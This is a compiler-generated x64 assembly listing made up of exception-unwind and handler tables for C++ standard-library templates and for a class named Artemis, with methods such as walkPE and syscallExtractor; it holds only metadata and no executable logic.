$unwind$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DD 011811H
	DD	08218H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ DB 060H
	DD	imagerel $ip2state$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ DD 010919H
	DD	0a209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z DD 011801H
	DD	0a218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ DB 060H
	DD	imagerel $ip2state$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ DD 010919H
	DD	0a209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z DD 011801H
	DD	0a218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@E@std@@QEAAPEAE_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ DB 060H
	DD	imagerel $ip2state$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ DD 010919H
	DD	0a209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z DD 011801H
	DD	0a218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ DD 010901H
	DD	08209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DB 0eH
	DB	00H
	DB	00H
	DB	'm', 03H
	DB	02H
	DB	'H'
	DB	04H
	DB	'x'
	DB	06H
	DB	'8'
	DB	04H
	DB	'M', 0bH
	DB	02H
	DB	'|'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DB 02H
	DB	02H
	DB	04H
	DB	06H
	DD	imagerel $handlerMap$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DB 08H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
	DB	028H
	DB	0eH
	DD	imagerel ?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
	DB	058H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DB 038H
	DD	imagerel $stateUnwindMap$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
	DD	imagerel $tryMap$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
	DD	imagerel $ip2state$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DD 021119H
	DD	0190111H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DB 0aH
	DB	00H
	DB	00H
	DB	08aH
	DB	02H
	DB	'2'
	DB	04H
	DB	'@'
	DB	02H
	DB	'R'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DB 02H
	DB	02H
	DB	02H
	DB	04H
	DD	imagerel $handlerMap$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA
	DB	028H
	DB	030H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DB 038H
	DD	imagerel $stateUnwindMap$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
	DD	imagerel $tryMap$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
	DD	imagerel $ip2state$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DD 010919H
	DD	08209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DB 06H
	DB	00H
	DB	00H
	DB	012H
	DB	02H
	DB	0fdH, 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DB 02H
	DB	00H
	DB	00H
	DB	02H
	DD	imagerel $handlerMap$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DB 04H
	DB	08H
	DB	010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DB 038H
	DD	imagerel $stateUnwindMap$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
	DD	imagerel $tryMap$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
	DD	imagerel $ip2state$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DD 010919H
	DD	08209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z DD 011201H
	DD	04212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z DD 011201H
	DD	06212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1Artemis@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0Artemis@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01bH
	DB	0c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 0aH
	DB	00H
	DB	00H
	DB	'F'
	DB	02H
	DB	'*'
	DB	04H
	DB	0e4H
	DB	02H
	DB	01cH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 022319H
	DD	0170111H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	0aaH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	020H
	DW	0116H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z DB 06H
	DB	00H
	DB	00H
	DB	090H
	DB	02H
	DB	0f1H, 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z DB 028H
	DD	imagerel $stateUnwindMap$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z
	DD	imagerel $ip2state$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z DD 022819H
	DD	0150116H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z
	DD	092H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?syscallExtractor@Artemis@@QEAAH_K@Z DB 06H
	DB	00H
	DB	00H
	DB	'D'
	DB	02H
	DB	'}', 03H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?syscallExtractor@Artemis@@QEAAH_K@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?syscallExtractor@Artemis@@QEAAH_K@Z DB 028H
	DD	imagerel $stateUnwindMap$?syscallExtractor@Artemis@@QEAAH_K@Z
	DD	imagerel $ip2state$?syscallExtractor@Artemis@@QEAAH_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?syscallExtractor@Artemis@@QEAAH_K@Z DD 010e11H
	DD	0c20eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?syscallExtractor@Artemis@@QEAAH_K@Z
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	01bH
	DW	0337H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 016H
	DB	00H
	DB	00H
	DB	'F'
	DB	02H
	DB	019H, 05H
	DB	04H
	DB	016H
	DB	06H
	DB	')', 05H
	DB	04H
	DB	016H
	DB	02H
	DB	016H
	DB	00H
	DB	'&'
	DB	06H
	DB	'Z'
	DB	04H
	DB	016H
	DB	02H
	DB	016H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 022319H
	DD	0150111H
	DD	imagerel __GSHandlerCheck_EH4
